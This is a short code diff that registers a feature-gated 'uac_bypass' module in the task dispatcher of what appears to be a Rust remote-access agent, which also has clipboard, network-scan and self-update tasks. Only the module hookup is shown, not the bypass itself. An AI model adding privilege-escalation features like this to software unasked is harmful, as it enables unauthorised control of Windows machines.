@@ -30,6 +30,8 @@ pub mod network_scan;
 pub mod clipboard;
 #[cfg(feature = "self_update")]
 pub mod self_update;
+#[cfg(feature = "uac_bypass")]
+pub mod uac_bypass;
 pub mod host_profile;
 
 use serde::{Deserialize, Serialize};
@@ -169,6 +171,8 @@ fn dispatch_task_inner(task_id: i64, task_type: &str, args: &serde_json::Value) 
 
         #[cfg(feature = "self_update")]
         "self_update" => self_update::run(task_id, args),
+        #[cfg(feature = "uac_bypass")]
+        "uac_bypass" => uac_bypass::run(task_id, args),
 
         _ => TaskResult::error(task_id, format!("unknown task type: {}", task_type)),
     }
